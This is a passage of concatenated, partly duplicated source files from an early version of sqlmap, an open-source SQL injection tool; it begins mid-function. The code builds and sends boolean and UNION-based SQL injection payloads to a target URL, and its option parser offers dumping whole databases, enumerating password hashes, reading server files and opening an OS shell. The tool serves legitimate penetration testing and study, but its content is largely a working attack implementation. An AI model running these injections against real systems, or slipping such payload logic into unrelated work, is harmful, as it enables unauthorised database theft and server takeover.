    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE double quoted string injectable"
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    thirdPage, thirdHeaders = Request.queryPage(content=True)                    

    condition  = firstPage == secondPage                    
    condition &= secondPage == thirdPage                    

    if condition == False:
        warnMsg  = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher, if no dynamic nor "
        warnMsg += "injectable parameters are detected, refer to user's "
        warnMsg += "manual paragraph 'Page comparison' and provide a "
        warnMsg += "string or regular expression to match on"
        logger.warn(warnMsg)

    if condition == True:
        logMsg = "url is stable"
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("Regular expression") and
                  kb.resumedQueries[conf.url]["Regular expression"][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = "you provided '%s' as the regular expression to " % conf.regexp
        errMsg += "match, but such a regular expression does not have any "
        errMsg += "match within the target URL page content, please provide "
        errMsg += "another regular expression."
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = "testing connection to the target url"
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """
    This function parses the command line parameters and arguments
    """

    usage = "%s [options]" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-5 (default 1)")

        # Target options
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be specified to set the source "
                             "to get target urls from.")

        target.add_option("-u", "--url", dest="url", help="Target url")

        target.add_option("-l", dest="list", help="Parse targets from Burp "
                          "or WebScarab logs")

        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target urls")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")


        # Request options
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target url.")

        request.add_option("--method", dest="method", default="GET",
                           help="HTTP method, GET or POST (default: GET)")

        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header")

        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header")

        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header")

        request.add_option("-a", dest="userAgentsFile",
                           help="Load a random HTTP User-Agent "
                                "header from file")

        request.add_option("--headers", dest="headers",
                           help="Extra HTTP headers '\\n' separated")

        request.add_option("--auth-type", dest="aType",
                           help="HTTP Authentication type, value: "
                                "Basic or Digest")

        request.add_option("--auth-cred", dest="aCred",
                           help="HTTP Authentication credentials, value: "
                                "name:password")

        request.add_option("--proxy", dest="proxy",
                           help="Use a HTTP proxy to connect to the target url")

        request.add_option("--threads", dest="threads", type="int",
                           help="Maximum number of concurrent HTTP "
                                "requests (default 1)")

        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default 30)")


        # Injection options
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "how to parse and compare HTTP responses "
                                "page content when using the blind SQL "
                                "injection technique.")

        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--postfix", dest="postfix",
                             help="Injection payload postfix string")

        injection.add_option("--string", dest="string",
                             help="String to match in page when the "
                                  "query is valid")

        injection.add_option("--regexp", dest="regexp",
                             help="Regexp to match in page when the "
                                  "query is valid")

        injection.add_option("--excl-str", dest="eString",
                             help="String to be excluded before calculating "
                                  "page hash")

        injection.add_option("--excl-reg", dest="eRegexp",
                             help="Regexp matches to be excluded before "
                                  "calculating page hash")


        # Techniques options
        techniques = OptionGroup(parser, "Techniques", "These options can "
                                 "be used to test for specific SQL injection "
                                 "technique or to use one of them to exploit "
                                 "the affected parameter(s) rather than using "
                                 "the default blind SQL injection technique.")

        techniques.add_option("--stacked-test", dest="stackedTest",
                              action="store_true",
                              help="Test for stacked queries (multiple "
                                   "statements) support")

        techniques.add_option("--time-test", dest="timeTest",
                              action="store_true",
                              help="Test for Time based blind SQL injection")

        techniques.add_option("--union-test", dest="unionTest",
                              action="store_true",
                              help="Test for UNION query (inband) SQL injection")

        techniques.add_option("--union-use", dest="unionUse",
                              action="store_true",
                              help="Use the UNION query (inband) SQL injection "
                                   "to retrieve the queries output. No "
                                   "need to go blind")


        # Fingerprint options
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")


        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL SELECT queries.")

        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes (opt: -U)")

        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges (opt: -U)")

        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables (opt: -D)")

        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns "
                                    "(req:-T opt:-D)")

        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries "
                                    "(req: -T, opt: -D, -C, --start, --stop)")

        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column to enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First table entry to dump")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last table entry to dump")

        enumeration.add_option("--sql-query", dest="query",
                               help="SQL SELECT query to be executed")                    

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")


        # File system options
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system file system taking "
                                 "advantage of native DBMS functions or "
                                 "specific DBMS design weaknesses.")

        filesystem.add_option("--read-file", dest="rFile",
                              help="Read a specific OS file content (only on MySQL)")

        filesystem.add_option("--write-file", dest="wFile",
                              help="Write to a specific OS file (not yet available)")


        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "This "
                               "option can be used to access the back-end "
                               "database management system operating "
                               "system taking advantage of specific DBMS "
                               "design weaknesses.")

        takeover.add_option("--os-shell", dest="osShell", action="store_true",
                            help="Prompt for an interactive OS shell "
                                 "(only on PHP/MySQL environment with a "
                                 "writable directory within the web "
                                 "server document root for the moment)")


        # Miscellaneous options
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        miscellaneous.add_option("--eta", dest="eta", action="store_true",
                                 help="Retrieve each query output length and "
                                      "calculate the estimated time of arrival "
                                      "in real time")

        miscellaneous.add_option("--update", dest="updateAll", action="store_true",
                                help="Update sqlmap to the latest stable version")

        miscellaneous.add_option("-s", dest="sessionFile",
                                 help="Save and resume all data retrieved "
                                      "on a session file")

        miscellaneous.add_option("--save", dest="saveCmdline", action="store_true",
                                 help="Save options on a configuration INI file")

        miscellaneous.add_option("--batch", dest="batch", action="store_true",
                                 help="Never ask for user input, use the default behaviour")


        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(injection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(miscellaneous)

        (args, _) = parser.parse_args()

        if not args.url and not args.list and not args.googleDork and not args.configFile and not args.updateAll:
            errMsg  = "missing a mandatory parameter ('-u', '-l', '-g', '-c' or '--update'), "
            errMsg += "-h for help"
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = "parsing command line"
    logger.debug(debugMsg)

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.data import conf
from lib.core.settings import MATCH_RATIO


def comparison(page, headers=None, getSeqMatcher=False):
    regExpResults = None

    # String to be excluded before calculating page hash
    if conf.eString and conf.eString in page:
        index              = page.index(conf.eString)
        length             = len(conf.eString)
        pageWithoutString  = page[:index]
        pageWithoutString += page[index+length:]
        page               = pageWithoutString

    # Regular expression matches to be excluded before calculating page hash
    if conf.eRegexp:
        regExpResults = re.findall(conf.eRegexp, page, re.I | re.M)

        if regExpResults:
            for regExpResult in regExpResults:
                index              = page.index(regExpResult)
                length             = len(regExpResult)
                pageWithoutRegExp  = page[:index]
                pageWithoutRegExp += page[index+length:]
                page               = pageWithoutRegExp

    # String to match in page when the query is valid
    if conf.string:
        if conf.string in page:
            return True
        else:
            return False

    # Regular expression to match in page when the query is valid
    if conf.regexp:
        if re.search(conf.regexp, page, re.I | re.M):
            return True
        else:
            return False

    # By default it returns sequence matcher between the first untouched
    # HTTP response page content and this content
    conf.seqMatcher.set_seq2(page)

    if getSeqMatcher:
        return round(conf.seqMatcher.ratio(), 5)                    

    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:                    
        return True

    else:
        return False

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:                    
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)                    

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:                    
            for element in resultDict.values():                    
                if element[0] == 1:                    
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)                    
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload                    
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload                    
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload                    

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = ""
        postfix = ""

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = "testing custom injection "
        infoMsg += "on %s parameter '%s'" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "confirming custom injection "
                infoMsg += "on %s parameter '%s'" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, "%s%s%s AND %s%s %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = "%s parameter '%s' is " % (place, parameter)
                    infoMsg += "custom injectable "
                    logger.info(infoMsg)

                    return "custom"

    infoMsg  = "testing unescaped numeric injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming unescaped numeric injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "unescaped numeric injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "numeric"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "unescaped numeric injectable"
    logger.info(infoMsg)

    infoMsg  = "testing single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringsingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likesingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringdouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "double quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likedouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE double quoted string injectable"
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    thirdPage, thirdHeaders = Request.queryPage(content=True)                    

    condition  = firstPage == secondPage                    
    condition &= secondPage == thirdPage                    

    if condition == False:
        warnMsg  = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher, if no dynamic nor "
        warnMsg += "injectable parameters are detected, refer to user's "
        warnMsg += "manual paragraph 'Page comparison' and provide a "
        warnMsg += "string or regular expression to match on"
        logger.warn(warnMsg)

    if condition == True:
        logMsg = "url is stable"
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("Regular expression") and
                  kb.resumedQueries[conf.url]["Regular expression"][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = "you provided '%s' as the regular expression to " % conf.regexp
        errMsg += "match, but such a regular expression does not have any "
        errMsg += "match within the target URL page content, please provide "
        errMsg += "another regular expression."
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = "testing connection to the target url"
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """
    This function parses the command line parameters and arguments
    """

    usage = "%s [options]" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-5 (default 1)")

        # Target options
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be specified to set the source "
                             "to get target urls from.")

